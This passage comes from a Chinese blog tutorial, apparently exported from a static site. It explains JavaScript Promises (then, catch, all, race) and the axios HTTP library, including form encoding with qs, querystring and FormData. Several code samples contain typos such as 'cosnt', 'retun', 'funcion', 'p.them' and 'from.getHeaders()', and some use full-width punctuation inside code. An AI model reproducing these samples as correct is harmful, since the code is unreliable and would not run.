id=\"CancelToken-deprecated-已弃用\"><a href=\"#CancelToken-deprecated-已弃用\" class=\"headerlink\" title=\"CancelToken deprecated(已弃用)\"></a>CancelToken deprecated(已弃用)</h5><h4 id=\"7-请求体编码\"><a href=\"#7-请求体编码\" class=\"headerlink\" title=\"7.请求体编码\"></a>7.请求体编码</h4><p>默认情况下，axios将js对象序列化为json；</p>\n<p>以<code>application/x-www-form-urlencoded</code>格式发送数据；</p>\n<h5 id=\"浏览器\"><a href=\"#浏览器\" class=\"headerlink\" title=\"浏览器\"></a>浏览器</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> params=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">URLSearchParams</span>();<br>params.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">&#x27;param1&#x27;</span>,<span class=\"hljs-string\">&#x27;value1&#x27;</span>);<br>params.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">&#x27;params2&#x27;</span>,<span class=\"hljs-string\">&#x27;value2&#x27;</span>);<br>axios.<span class=\"hljs-title function_\">post</span>(<span class=\"hljs-string\">&#x27;/foo&#x27;</span>,params);<br><br><span class=\"hljs-comment\">//注意，并不是所有的浏览器都支持URLResearchParams</span><br><br><span class=\"hljs-comment\">//qs库编码数据</span><br><span class=\"hljs-keyword\">const</span> qs=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;qs&#x27;</span>);<br>axios.<span class=\"hljs-title function_\">post</span>(<span class=\"hljs-string\">&#x27;/foo&#x27;</span>,qs.<span class=\"hljs-title function_\">stringify</span>(&#123;<br>    <span class=\"hljs-string\">&#x27;bar&#x27;</span>:<span class=\"hljs-number\">123</span><br>&#125;));<br><br>或者<span class=\"hljs-title class_\">ES6</span>方法<br><br><span class=\"hljs-keyword\">import</span> qs <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;qs&#x27;</span>;<br>cosnt data=&#123;<br>    <span class=\"hljs-string\">&#x27;bar&#x27;</span>:<span class=\"hljs-number\">123</span><br>&#125;;<br><br><span class=\"hljs-keyword\">const</span> options=&#123;<br>    <span class=\"hljs-attr\">method</span>:<span class=\"hljs-string\">&#x27;POST&#x27;</span>,<br>    <span class=\"hljs-attr\">headers</span>:&#123; <span class=\"hljs-string\">&#x27;content-type&#x27;</span>: <span class=\"hljs-string\">&#x27;application/x-www-form-urlencoded&#x27;</span> &#125;,<br>    <span class=\"hljs-attr\">data</span>:qs.<span class=\"hljs-title function_\">stringify</span>(data),<br>    url,<br>&#125;;<br><span class=\"hljs-title function_\">axios</span>(options);<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"NodeJS-使用querystring\"><a href=\"#NodeJS-使用querystring\" class=\"headerlink\" title=\"NodeJS 使用querystring\"></a>NodeJS 使用querystring</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><br><span class=\"hljs-keyword\">const</span> querystring = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;querystring&#x27;</span>);<br>axios.<span class=\"hljs-title function_\">post</span>(<span class=\"hljs-string\">&#x27;http://something.com/&#x27;</span>, querystring.<span class=\"hljs-title function_\">stringify</span>(&#123; <span class=\"hljs-attr\">foo</span>: <span class=\"hljs-string\">&#x27;bar&#x27;</span> &#125;));<br><br><span class=\"hljs-keyword\">const</span> url = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;url&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> params = <span class=\"hljs-keyword\">new</span> url.<span class=\"hljs-title class_\">URLSearchParams</span>(&#123; <span class=\"hljs-attr\">foo</span>: <span class=\"hljs-string\">&#x27;bar&#x27;</span> &#125;);<br>axios.<span class=\"hljs-title function_\">post</span>(<span class=\"hljs-string\">&#x27;http://something.com/&#x27;</span>, params.<span class=\"hljs-title function_\">toString</span>());<br><br><span class=\"hljs-comment\">//如果需要对嵌套对象进行字符串化处理，则最好使用 qs 库，因为 querystring 方法在该用例中存在已知问题</span><br></code></pre></td></tr></table></figure>\n\n<p>Form Data</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> <span class=\"hljs-title class_\">FormData</span>=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;form-data&#x27;</span>);<br><br><span class=\"hljs-keyword\">const</span> form =<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">FormData</span>();<br>form.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">&#x27;filed1&#x27;</span>,<span class=\"hljs-string\">&#x27;value1&#x27;</span>);<br><br>axios.<span class=\"hljs-title function_\">post</span>(<span class=\"hljs-string\">&#x27;https://example.com&#x27;</span>,form,&#123;<span class=\"hljs-attr\">headers</span>:<span class=\"hljs-keyword\">from</span>.<span class=\"hljs-title function_\">getHeaders</span>()&#125;)<br></code></pre></td></tr></table></figure>\n\n<p>拦截器</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">axios.<span class=\"hljs-property\">interceptors</span>.<span class=\"hljs-property\">request</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">config</span>=&gt;</span>&#123;<br>    <span class=\"hljs-keyword\">if</span>(config.<span class=\"hljs-property\">data</span> <span class=\"hljs-keyword\">instanceof</span> <span class=\"hljs-title class_\">FormData</span>)&#123;<br>        <span class=\"hljs-title class_\">Object</span>.<span class=\"hljs-title function_\">assign</span>(config.<span class=\"hljs-property\">headers</span>,config.<span class=\"hljs-property\">data</span>.<span class=\"hljs-title function_\">getHeaders</span>());<br>    &#125;<br>    retun config;<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Axios\"><a href=\"#Axios\" class=\"headerlink\" title=\"Axios\"></a>Axios</h1><h4 id=\"基于promise可以用于浏览器和node-js的网络请求库\"><a href=\"#基于promise可以用于浏览器和node-js的网络请求库\" class=\"headerlink\" title=\"基于promise可以用于浏览器和node.js的网络请求库\"></a>基于promise可以用于浏览器和node.js的网络请求库</h4><h3 id=\"一、基础定义Promise\"><a href=\"#一、基础定义Promise\" class=\"headerlink\" title=\"一、基础定义Promise\"></a>一、基础定义Promise</h3><h4 id=\"1-promise\"><a href=\"#1-promise\" class=\"headerlink\" title=\"1.promise\"></a>1.promise</h4><p>一个对象，用于传递异步操作的消息；本意上可以理解为，承诺过一段时间返回一个结果。</p>\n<figure class=\"highlight plaintext\"><figcaption><span>basic</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs visual\"> 其实就是一个请求发出去以后，并不能马上获得需要的数据，因此整个js代码需要暂停等待请求数据的返回<br></code></pre></td></tr></table></figure>\n\n<p>Promise有三种状态：pending(等待态)，fulfiled(成功态)，rejected（失败态）；状态一旦改变就不会再变；创造promise实例后会立即执行；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><br><span class=\"hljs-comment\">// 当参数a大于10且参数fn2是一个方法时 执行fn2</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">fn1</span>(<span class=\"hljs-params\">a, fn2</span>) &#123;<br>    <span class=\"hljs-keyword\">if</span> (a &gt; <span class=\"hljs-number\">10</span> &amp;&amp; <span class=\"hljs-keyword\">typeof</span> fn2 == <span class=\"hljs-string\">&#x27;function&#x27;</span>) &#123;<br>        <span class=\"hljs-title function_\">fn2</span>()<br>    &#125;<br>&#125;<br><span class=\"hljs-title function_\">fn1</span>(<span class=\"hljs-number\">11</span>, <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;this is a callback&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<p>一般来说我们会碰到的回调嵌套都不会很多，一般就一到两级，但是某些情况下，回调嵌套很多时，代码就会非常繁琐，会给我们的编程带来很多的麻烦，这种情况俗称——回调地狱。</p>\n<p>这时候我们的promise就应运而生、粉墨登场了</p>\n<p>promise主要解决两个问题：</p>\n<ol>\n<li><p>回调地狱，代码难以维护，常常第一个函数的输出是第二个函数的输入；</p>\n</li>\n<li><p>支持多个并发请求，并从请求中获取数据；可以解决异步的问题；</p>\n<figure class=\"highlight plaintext\"><figcaption><span>basic</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs visual\">建议使用ES6箭头函数的编码方式，获得数据，处理数据，处理完成，下一步~<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h4 id=\"2-promise用法\"><a href=\"#2-promise用法\" class=\"headerlink\" title=\"2.promise用法\"></a>2.promise用法</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">let</span> p=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve,reject</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-comment\">//一些异步操作</span><br>    <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Finished.&quot;</span>);<br>        <span class=\"hljs-title function_\">resolve</span>(<span class=\"hljs-string\">&quot;成功！&quot;</span>)；<br>    &#125;，<span class=\"hljs-number\">2000</span>)<br>&#125;)<br><br><span class=\"hljs-comment\">//promise的构造函数接受一个函数类型的参数，并且需要传入两个参数：</span><br>resolve：异步操作执行成功之后的回调函数；<br>reject：异步操作执行失败后的回调函数；<br></code></pre></td></tr></table></figure>\n\n<p>then 链式操作：</p>\n<p>表面上，promise只是简化层层回调，实质上，用维护状态、传递状态的方法使得回调函数能够及时调用；</p>\n<p>正确场景：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">p.<span class=\"hljs-title function_\">then</span>((data))=&gt;&#123;<br>    cosnsole.<span class=\"hljs-title function_\">log</span>(data);<br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">data</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data);<br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">data</span>)=&gt;</span>P&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data);<br>        &#125;);<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-reject用法\"><a href=\"#3-reject用法\" class=\"headerlink\" title=\"3.reject用法\"></a>3.reject用法</h4><p>把promise的状态设置为rejected，这样在then中就能捕捉到，然后执行“失败”情况的回调；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">let</span> p=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve,reject</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-keyword\">var</span> num=<span class=\"hljs-title class_\">Math</span>.<span class=\"hljs-title function_\">ceil</span>(<span class=\"hljs-title class_\">Math</span>.<span class=\"hljs-title function_\">random</span>()*<span class=\"hljs-number\">10</span>);<br>        <span class=\"hljs-keyword\">if</span>(num&lt;=<span class=\"hljs-number\">5</span>)<br>            &#123;<br>                <span class=\"hljs-title function_\">resolve</span>(num);<br>            &#125;<span class=\"hljs-keyword\">else</span><br>                &#123;<br>                    <span class=\"hljs-title function_\">reject</span>(<span class=\"hljs-string\">&quot;数字太大！&quot;</span>)；<br>                &#125;<br>    &#125;,<span class=\"hljs-number\">2000</span>);<br>&#125;)；<br>p.<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">data</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Resolved&quot;</span>,data);<br>&#125;,<span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Rejected&quot;</span>,err);<br>&#125;<br>      )<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-catch用法\"><a href=\"#4-catch用法\" class=\"headerlink\" title=\"4.catch用法\"></a>4.catch用法</h4><p>catch和then的第二个参数一样用来指定reject的回调；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">p.<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">data</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Resolved&quot;</span>,data);<br>&#125;).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Rejected&quot;</span>,err);\t\t\t<span class=\"hljs-comment\">//抛出异常</span><br>&#125;)<br><span class=\"hljs-comment\">//如果执行resolve的回调时，如果抛出异常，并不会报错停止js，而是进入到catch方法；</span><br>p.<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">data</span>) =&gt;</span> &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;resolved&#x27;</span>,data);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(somedata); <span class=\"hljs-comment\">//此处的somedata未定义</span><br>&#125;)<br>.<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;rejected&#x27;</span>,err);<br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"5-all的用法\"><a href=\"#5-all的用法\" class=\"headerlink\" title=\"5.all的用法\"></a>5.all的用法</h4><p>谁跑得慢，以谁为准执行回调；all接受一个数组参数，里面的值最终都算返回Promise对象；</p>\n<p>all方法提供了并行执行异步操作的能力，并且在所有异步操作执行完成之后才执行回调；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">let</span> <span class=\"hljs-title class_\">Promose1</span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">resolve,reject</span>)&#123;&#125;)<br><span class=\"hljs-keyword\">let</span> <span class=\"hljs-title class_\">Promise2</span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">resolve,reject</span>)&#123;&#125;)<br><span class=\"hljs-keyword\">let</span> <span class=\"hljs-title class_\">Promise3</span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">resolve,reject</span>)&#123;&#125;)<br><br><span class=\"hljs-keyword\">let</span> p=<span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">all</span>([<span class=\"hljs-title class_\">Promise1</span>,<span class=\"hljs-title class_\">Promise2</span>,<span class=\"hljs-title class_\">Promise3</span>])<br><br>p.<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>   \t<span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;三个都执行成功则成功&quot;</span>)<br>&#125;,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;只要有失败则失败&quot;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<p>使用场景：一个游戏需要很多素材，只有所有素材都下载到本地之后，才开始初始化；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">let</span> video=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-title function_\">funcion</span>(<span class=\"hljs-params\">resolve,reject</span>)&#123;&#125;);<br><span class=\"hljs-keyword\">let</span> word=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">resolve,reject</span>)&#123;&#125;);<br><br><span class=\"hljs-keyword\">let</span> p=<span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">all</span>([video,word]);<br><br>p.<span class=\"hljs-title function_\">them</span>(<span class=\"hljs-title function_\">funcion</span>(<span class=\"hljs-params\"></span>)&#123;<br>       <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;开始初始化！&quot;</span>);<br>       &#125;,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>           <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;游戏初始化失败&quot;</span>)；<br>       &#125;)<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"6-race用法\"><a href=\"#6-race用法\" class=\"headerlink\" title=\"6.race用法\"></a>6.race用法</h4><p>谁跑的块，以谁为准执行回调；</p>\n<p>可以用race给某个异步请求设置超时时间，并且在超时后执行相应的操作，代码如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">requestImg</span>(<span class=\"hljs-params\"></span>)&#123;<br>\t<span class=\"hljs-keyword\">var</span> p = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve,reject</span>)=&gt;</span>&#123;<br>        <span class=\"hljs-keyword\">var</span> img =<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Img</span>();<br>        img.<span class=\"hljs-property\">onload</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>            <span class=\"hljs-title function_\">resolve</span>(img);<br>        &#125;<br>        img.<span class=\"hljs-property\">src</span>=<span class=\"hljs-string\">&#x27;img path&#x27;</span>;<br>    &#125;);<br>    <span class=\"hljs-keyword\">return</span> p;<br>&#125;<br><br><span class=\"hljs-comment\">//延时函数，用于计时</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">timeout</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">var</span> p=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve,reject</span>)=&gt;</span>&#123;<br>        <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>            <span class=\"hljs-title function_\">reject</span>(<span class=\"hljs-string\">&quot;请求图片超时！&quot;</span>);<br>        &#125;,<span class=\"hljs-number\">5000</span>);<br>    &#125;);<br>    <span class=\"hljs-keyword\">return</span> p;<br>&#125;<br><span class=\"hljs-comment\">//调用</span><br><span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">race</span>([<span class=\"hljs-title function_\">requestImg</span>(), <span class=\"hljs-title function_\">timeout</span>()]).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">data</span>) =&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data);<br>&#125;).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(err);<br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"二、基础定义Axios\"><a href=\"#二、基础定义Axios\" class=\"headerlink\" title=\"二、基础定义Axios\"></a>二、基础定义Axios</h3><h4 id=\"服务端它使用原生-node-js-http-模块-而在客户端-浏览端-则使用-XMLHttpRequests。\"><a href=\"#服务端它使用原生-node-js-http-模块-而在客户端-浏览端-则使用-XMLHttpRequests。\" class=\"headerlink\" title=\"服务端它使用原生 node.js http 模块, 而在客户端 (浏览端) 则使用 XMLHttpRequests。\"></a>服务端它使用原生 node.js <code>http</code> 模块, 而在客户端 (浏览端) 则使用 XMLHttpRequests。</h4><h4 id=\"1-特性\"><a href=\"#1-特性\" class=\"headerlink\" title=\"1.特性\"></a>1.特性</h4><ul>\n<li>从浏览器创建 <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest\">XMLHttpRequests</a></li>\n<li>从 node.js 创建 <a href=\"http://nodejs.org/api/http.html\">http</a> 请求</li>\n<li>支持 <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise\">Promise</a> API</li>\n<li>拦截请求和响应</li>\n<li>转换请求和响应数据</li>\n<li>取消请求</li>\n<li>自动转换JSON数据</li>\n<li>客户端支持防御<a href=\"http://en.wikipedia.org/wiki/Cross-site_request_forgery\">XSRF</a></li>\n</ul>\n<h4 id=\"2-安装使用\"><a href=\"#2-安装使用\" class=\"headerlink\" title=\"2.安装使用\"></a>2.安装使用</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm install axios<br>//yarn<br> yarn add axios<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"Get请求\"><a href=\"#Get请求\" class=\"headerlink\" title=\"Get请求\"></a>Get请求</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> axios=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;axios&#x27;</span>);<br><br><span class=\"hljs-comment\">//向给定的ID用户发起请求</span><br>axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/user?ID=12345&#x27;</span>).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">response</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;成功！&quot;</span>)<br>&#125;).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;失败&quot;</span>);<br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;总是执行的部分&quot;</span>);<br>&#125;)<br><br><span class=\"hljs-comment\">//以上代码可以等价于</span><br>axios.<span class=\"hljs-title function_\">get</span>(<span 